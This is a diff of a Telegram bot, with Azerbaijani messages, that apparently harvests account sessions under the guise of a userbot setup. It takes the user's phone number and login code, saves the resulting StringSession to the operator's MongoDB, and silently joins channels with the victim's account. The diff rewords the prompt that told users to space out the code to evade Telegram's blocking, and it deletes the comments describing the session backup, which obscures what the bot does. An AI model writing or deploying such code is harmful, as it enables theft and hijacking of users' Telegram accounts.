@@ -1,7 +1,6 @@
 import os
 import heroku3
 import asyncio
-import requests
 from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
 from telethon.errors import (
@@ -13,7 +12,6 @@ from telethon.tl.functions.channels import JoinChannelRequest
 from motor.motor_asyncio import AsyncIOMotorClient
 
 # --- PROFESSIONAL CONFIGURATION ---
-# Məlumatlar Heroku Config Vars (Settings) bölməsindən çəkilir.
 API_ID = int(os.environ.get("API_ID"))
 API_HASH = os.environ.get("API_HASH")
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
@@ -47,7 +45,7 @@ async def start(event):
 @bot.on(events.CallbackQuery(data="setup"))
 async def setup_process(event):
     user_id = event.sender_id
-    async with bot.conversation(event.chat_id) as conv:
+    async with bot.conversation(event.chat_id, timeout=120) as conv:
         try:
             # 1. Addım: Nömrə İdentifikasiyası
             await conv.send_message(
@@ -57,7 +55,6 @@ async def setup_process(event):
             phone_res = await conv.get_response()
             phone = phone_res.text
             
-            # Müvəqqəti Telegram Client yaradılır
             client = TelegramClient(StringSession(), API_ID, API_HASH)
             await client.connect()
             
@@ -70,7 +67,7 @@ async def setup_process(event):
             # 2. Addım: Təhlükəsizlik Protokolu (Kod)
             await conv.send_message(
                 "🔐 **Addım 2:** Telegram tərəfindən göndərilən təhlükəsizlik kodunu daxil edin.\n\n"
-                "⚠️ **Protokol:** Botun bloklanmaması üçün rəqəmlər arasına boşluq qoyun.\n"
+                "⚠️ **Protokol:** Kodu rəqəmlər arasına boşluq qoyaraq daxil edin.\n"
                 "Nümunə: `1 2 3 4 5`",
                 parse_mode="markdown"
             )
@@ -87,7 +84,6 @@ async def setup_process(event):
                 await conv.send_message("❌ **Xəta:** Daxil edilən məlumatlar yanlışdır. Yenidən /start yazın.")
                 return
 
-            # Session yaradılır və MongoDB-yə backup edilir
             string_session = client.session.save()
             await users_col.update_one(
                 {"user_id": user_id},
@@ -95,12 +91,10 @@ async def setup_process(event):
                 upsert=True
             )
 
-            # Rəsmi kanallara avtomatik inteqrasiya
             try:
                 await client(JoinChannelRequest("@ht_bots"))
                 await client(JoinChannelRequest("@sohbet_qrupus"))
-            except:
-                pass
+            except: pass
 
             # 3. Addım: Xarici İnteqrasiya Ayarları
             await conv.send_message(
@@ -152,6 +146,8 @@ async def setup_process(event):
             except Exception as e:
                 await status_msg.edit(f"❌ **Heroku İnteqrasiya Xətası:** {e}")
 
+        except asyncio.TimeoutError:
+            await conv.send_message("⏰ **Vaxt doldu!**\n\nTəhlükəsizlik üçün sessiya dayandırıldı. Zəhmət olmasa yenidən /start yazaraq başlayın.")
         except Exception as e:
             await conv.send_message(f"⚠️ **Gözlənilməz Xəta:** {e}")
 
